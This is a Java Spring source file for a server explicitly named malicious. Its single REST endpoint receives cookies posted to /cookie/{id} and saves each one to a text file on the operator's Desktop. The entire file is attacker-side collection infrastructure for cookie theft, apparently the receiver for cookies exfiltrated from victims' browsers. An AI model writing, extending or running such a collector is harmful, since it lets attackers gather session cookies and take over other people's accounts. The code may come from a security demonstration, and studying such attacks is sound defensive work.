package com.maliciousServer.controller;

import java.io.BufferedWriter;
import java.io.File;
import java.io.FileWriter;
import java.io.IOException;

import org.springframework.http.HttpEntity;
import org.springframework.http.HttpStatus;
import org.springframework.http.ResponseEntity;
import org.springframework.web.bind.annotation.PathVariable;
import org.springframework.web.bind.annotation.RequestBody;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestMethod;
import org.springframework.web.bind.annotation.RestController;


@RestController
@RequestMapping(value= "cookie")
public class CookieController {
	
	@RequestMapping(value="/{id}", method = RequestMethod.POST, consumes="text/plain")
	public ResponseEntity<Void> saveCookie(@RequestBody String cookie, @PathVariable int id){
		BufferedWriter bw = null;
		FileWriter fw = null;
		String userHomeFolder = System.getProperty("user.home");
		File textFile = new File(userHomeFolder, "Desktop\\cookie_user_id_"+id+".txt");
		try {

			String content = cookie;

			fw = new FileWriter(textFile);
			bw = new BufferedWriter(fw);
			bw.write(content);

		} catch (IOException e) {

			e.printStackTrace();

		} finally {

			try {

				if (bw != null)
					bw.close();

				if (fw != null)
					fw.close();

			} catch (IOException ex) {

				ex.printStackTrace();

			}

		}

		return new ResponseEntity<>(HttpStatus.OK);
	}

}
